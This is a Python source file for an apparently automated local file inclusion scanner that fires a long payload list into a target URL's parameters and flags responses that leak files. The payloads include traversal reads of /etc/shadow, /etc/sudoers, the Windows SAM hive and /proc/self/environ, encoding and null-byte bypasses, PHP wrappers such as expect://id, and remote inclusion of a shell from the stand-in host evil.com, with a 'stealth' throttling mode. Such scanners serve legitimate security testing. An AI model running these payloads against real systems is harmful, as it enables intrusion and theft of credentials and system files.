from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio

class LFIScanner(BaseScanner):
    """Local File Inclusion vulnerability scanner - Ultra Massive Payloads"""
    
    def __init__(self, session, target: str, stealth: bool = False, massive: bool = False):
        super().__init__(session, target, stealth, massive)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load massive LFI payloads"""
        base_payloads = [
            # Linux
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            
            # Windows
            "..\\..\\..\\windows\\win.ini",
            "..\\windows\\win.ini",
            "....\\....\\windows\\win.ini",
            
            # Null byte injection
            "../../../../etc/passwd%00",
            "../../../etc/passwd%00",
            "../../etc/passwd%00",
            "..\\..\\..\\windows\\win.ini%00",
            
            # Double encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # UTF-8 encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        ]
        
        massive_payloads = [
            # Linux sensitive files
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            "../../../../etc/group",
            "../../../../etc/passwd~",
            "../../../../etc/master.passwd",
            "../../../../etc/sudoers",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log",
            "../../../../var/log/httpd/access_log",
            "../../../../proc/self/environ",
            "../../../../proc/self/cmdline",
            "../../../../proc/version",
            
            # Windows sensitive files
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\php.ini",
            "..\\..\\..\\windows\\my.ini",
            "..\\..\\..\\windows\\system32\\inetsrv\\metabase.xml",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "expect://id",
            
            # Remote inclusion
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "\\\\evil.com\\shell.txt",
        ]
        
        if self.massive:
            return base_payloads + massive_payloads
        return base_payloads[:20] if self.stealth else base_payloads
        
    async def scan(self) -> List[Dict]:
        """Execute LFI scan"""
        if '?' in self.target:
            await self._test_url_parameters()
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for LFI"""
        try:
            base_url, params = self.target.split('?', 1)
            param_pairs = [p.split('=', 1) for p in params.split('&')]
            
            for param_name, param_value in param_pairs:
                for idx, payload in enumerate(self.payloads):
                    if self.stealth and idx > 10:
                        break
                        
                    test_params = {param_name: payload}
                    test_url = self._build_url(base_url, test_params)
                    
                    result = await self.test_payload(payload, test_url)
                    if result:
                        self.add_result(
                            'Local File Inclusion (LFI)',
                            'HIGH',
                            test_url,
                            f"Parameter '{param_name}' vulnerable with payload: {payload}"
                        )
                        break
                        
                    await asyncio.sleep(0.2 if self.stealth else 0.05)
        except Exception as e:
            pass
            
    async def test_payload(self, payload: str, url: str) -> Optional[Dict]:
        """Test LFI payload"""
        try:
            response = await self.http_client.get(url)
            
            if response:
                is_vulnerable = self.validator.validate_lfi(response.text, payload)
                if is_vulnerable:
                    return {'vulnerable': True, 'payload': payload}
        except Exception as e:
            pass
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
